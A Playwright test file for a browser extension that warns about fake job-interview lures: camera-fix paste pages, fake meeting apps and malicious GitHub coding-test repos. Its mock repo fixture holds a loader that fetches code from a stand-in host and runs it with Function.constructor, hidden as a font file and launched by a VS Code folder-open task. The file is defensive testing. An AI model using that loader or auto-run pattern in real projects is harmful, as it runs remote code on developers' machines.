/**
 * Browser verification for the fake job interview checks: the "fix your
 * camera" paste lure (free), the fake meeting-app download (paid) and the
 * coding-test repo card on GitHub (paid).
 *
 * Pages, the GitHub API and raw files are all served through
 * context.route(); nothing reaches the real hosts. Copied commands point at
 * reserved .example hosts and are never run.
 *
 * Run: node tests/interview-verify.mjs   (EXT_DIR=dist/chrome for the store build)
 */
import { chromium } from "playwright";
import { readFileSync, mkdtempSync, mkdirSync } from "fs";
import { resolve, dirname, join } from "path";
import { fileURLToPath } from "url";
import { tmpdir } from "os";

const __dirname = dirname(fileURLToPath(import.meta.url));
const ROOT = resolve(__dirname, "..");
const EXT = resolve(ROOT, process.env.EXT_DIR || "extension");
const SHOTS = resolve(__dirname, "screenshots");

let pass = 0, fail = 0;
const ok = (label, cond, detail = "") => {
  console.log(`  ${cond ? "PASS" : "FAIL"}: ${label}${cond ? "" : detail ? " — " + detail : ""}`);
  cond ? pass++ : fail++;
};

const fixture = (name) => readFileSync(resolve(__dirname, name), "utf8");
const TRIAL = { install_id: "test", trial_active: true, is_paid: false, pro_enabled: true };
const FREE = { install_id: "test", trial_active: false, is_paid: false, pro_enabled: false };

/* Two fake repos: one laid out like the published Contagious Interview
   samples, one ordinary. */
const BAD_LOADER = `const axios = require("axios");
axios.get("http://chainlink-api.example/api/7").catch((err) => {
  const handler = new (Function.constructor)("require", err.response.data);
  handler(require);
});`;
const REPOS = {
  "acme/test-task": {
    "README.md": "# Technical assessment\nRun `npm install` and `npm start`, then fix the login bug.",
    "package.json": JSON.stringify({ name: "dex-dashboard", scripts: { start: "node server/index.js" } }),
    ".vscode/tasks.json": JSON.stringify({ version: "2.0.0", tasks: [{ label: "eslint-check", type: "shell",
      command: "node public/font/fa-brands-regular.woff2", runOptions: { runOn: "folderOpen" } }] }),
    "public/font/fa-brands-regular.woff2": BAD_LOADER,
    "server/index.js": "require('./routes/profile');",
    "server/routes/profile.js": BAD_LOADER,
  },
  "acme/todo-app": {
    "README.md": "# Todo app\nA small Express todo list.",
    "package.json": JSON.stringify({ name: "todo", scripts: { start: "node index.js", prepare: "husky install" } }),
    "index.js": "const express = require('express'); express().listen(3000);",
  },
};
let apiCalls = 0;

mkdirSync(SHOTS, { recursive: true });
const context = await chromium.launchPersistentContext(mkdtempSync(join(tmpdir(), "phishclean-interview-")), {
  headless: false,
  args: [
    `--disable-extensions-except=${EXT}`, `--load-extension=${EXT}`,
    "--no-first-run", "--no-default-browser-check", "--no-sandbox",
    "--disable-features=DisableLoadExtensionCommandLineSwitch",
  ],
});

await context.route("**://www.phishclean.com/**", (route) => route.abort());
const serve = (pattern, file) => context.route(pattern, (r) => r.fulfill({ status: 200, contentType: "text/html", body: fixture(file) }));
await serve("https://interview-room.example/**", "test-fake-interview.html");
await serve("https://zoom-meeting-join.example/**", "test-fake-meeting.html");

const cors = { "access-control-allow-origin": "*" };
await context.route("https://github.com/**", (r) => {
  const [, owner, repo] = new URL(r.request().url()).pathname.split("/");
  r.fulfill({ status: 200, contentType: "text/html", body: `<!doctype html><title>${owner}/${repo}</title><h1>${owner}/${repo}</h1><p>Repository page</p>` });
});
await context.route("https://api.github.com/**", (r) => {
  apiCalls++;
  const m = new URL(r.request().url()).pathname.match(/^\/repos\/([^/]+\/[^/]+)(\/git\/trees\/main)?$/);
  const files = m && REPOS[m[1]];
  if (!files) return r.fulfill({ status: 404, headers: cors, body: "{}" });
  const body = m[2]
    ? { tree: Object.keys(files).map((path) => ({ path, type: "blob", size: files[path].length })) }
    : { default_branch: "main", created_at: "2026-10-25T00:00:00Z", stargazers_count: 0, fork: false };
  r.fulfill({ status: 200, contentType: "application/json", headers: cors, body: JSON.stringify(body) });
});
await context.route("https://raw.githubusercontent.com/**", (r) => {
  const [, owner, repo, , ...rest] = new URL(r.request().url()).pathname.split("/");
  const text = REPOS[`${owner}/${repo}`]?.[decodeURIComponent(rest.join("/"))];
  r.fulfill(text == null ? { status: 404, headers: cors, body: "" } : { status: 200, contentType: "text/plain", headers: cors, body: text });
});

try {
  let [worker] = context.serviceWorkers();
  if (!worker) worker = await context.waitForEvent("serviceworker", { timeout: 30000 });
  await new Promise((r) => setTimeout(r, 1500));
  const setLicense = (l) => worker.evaluate((v) => chrome.storage.local.set({ phishclean_license: v }), l);

  const open = async (url, wait = 1500) => {
    const page = await context.newPage();
    await page.goto(url);
    await page.waitForTimeout(wait);
    return page;
  };
  const modalShown = async (page) => (await page.locator("#phishclean-root").count()) === 1;
  const cardShown = async (page) => (await page.locator("#phishclean-repo-check").count()) === 1;
  const lastLogged = () => worker.evaluate(() =>
    chrome.storage.local.get("phishclean_threat_log").then((d) => (d.phishclean_threat_log || []).at(-1) || null));

  console.log("\n1. Fake interview camera fix, free tier");
  for (const [label, query] of [["macOS Terminal steps", ""], ["Windows Run-box steps", "?os=win"]]) {
    await setLicense(FREE);
    const page = await open(`https://interview-room.example/${query}`);
    ok(`${label}: no warning before the click`, !(await modalShown(page)));
    await page.click("#enable");
    await page.waitForTimeout(1500);
    ok(`${label}: warning after the click`, await modalShown(page));
    if (!query) await page.screenshot({ path: join(SHOTS, "fake-interview.png") });
    await page.close();
  }
  const logged = await lastLogged();
  ok("logged as FAKE_INTERVIEW_FIX", logged?.signals?.includes("FAKE_INTERVIEW_FIX"), JSON.stringify(logged?.signals));

  console.log("\n2. Fake meeting app");
  await setLicense(FREE);
  let page = await open("https://zoom-meeting-join.example/join");
  ok("free tier: no warning (paid check)", !(await modalShown(page)));
  await page.close();
  await setLicense(TRIAL);
  page = await open("https://zoom-meeting-join.example/join");
  ok("trial: warning", await modalShown(page));
  await page.screenshot({ path: join(SHOTS, "fake-meeting-app.png") });
  await page.close();
  await setLicense(TRIAL);
  page = await open("https://zoom-meeting-join.example/join?real=1");
  ok("trial, link to zoom.us: no warning", !(await modalShown(page)));
  await page.close();

  console.log("\n3. Coding-test repo card on GitHub");
  await setLicense(FREE);
  page = await open("https://github.com/acme/test-task", 3000);
  ok("free tier: no card and no requests", !(await cardShown(page)) && apiCalls === 0, `api calls ${apiCalls}`);
  await page.close();

  await setLicense(TRIAL);
  page = await open("https://github.com/acme/test-task", 4000);
  ok("trial, malicious repo: card shown", await cardShown(page));
  await page.screenshot({ path: join(SHOTS, "repo-check-card.png") });
  const cached = await worker.evaluate(() => chrome.storage.local.get("phishclean_repo_checks").then((d) => d.phishclean_repo_checks?.["github:acme/test-task"]));
  ok("result cached as danger with the task finding", cached?.verdict === "danger" && cached.findings.some((f) => f.rule === "vscode-autorun"), JSON.stringify(cached?.findings?.map((f) => f.rule)));
  ok("coding-test README recognised", cached?.codingTest === true);
  await page.close();

  const callsBefore = apiCalls;
  await setLicense(TRIAL);
  page = await open("https://github.com/acme/test-task/tree/main/server", 2500);
  ok("second visit: card again, served from cache", (await cardShown(page)) && apiCalls === callsBefore, `api calls +${apiCalls - callsBefore}`);
  await page.close();

  await setLicense(TRIAL);
  page = await open("https://github.com/acme/todo-app", 4000);
  ok("trial, ordinary repo: no card", !(await cardShown(page)));
  await page.close();

  /* The card's shadow root is closed, so set what its Dismiss button stores. */
  await worker.evaluate(() => chrome.storage.local.get("phishclean_repo_checks").then((d) => {
    d.phishclean_repo_checks["github:acme/test-task"].dismissed = true;
    return chrome.storage.local.set(d);
  }));
  await setLicense(TRIAL);
  page = await open("https://github.com/acme/test-task", 2500);
  ok("dismissed repo: no card", !(await cardShown(page)));
  await page.close();
} finally {
  await context.close();
}

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
